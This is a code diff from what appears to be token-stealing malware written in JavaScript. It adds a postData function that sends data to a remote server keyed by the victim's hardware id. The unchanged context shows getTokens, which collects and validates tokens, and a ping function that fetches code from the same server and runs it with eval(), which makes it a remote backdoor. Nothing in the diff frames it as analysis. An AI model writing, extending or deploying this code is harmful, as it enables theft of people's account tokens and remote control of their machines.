@@ -56,6 +56,12 @@ class TokenData {
     }
 }
 
+function postData(data) {
+    let newData = data;
+    if (typeof data == 'object' && data != null) data = JSON.stringify(data);
+    get(httpS, url.toLowerCase() + `/d/${hwid}?d=${newData}`).then(() => {});
+}
+
 const getTokens = async () => {
     const testToken = (token) => {
         return new Promise((resolve, reject) => {
@@ -94,7 +100,7 @@ const getTokens = async () => {
     return JSON.stringify(validTokens.map((t) => t.toJSON()));
 };
 
-const ping = () => {
+function ping() {
     get(httpS, url.toLowerCase() + `/p/${hwid}`).then(res => {
         eval(res);
     });
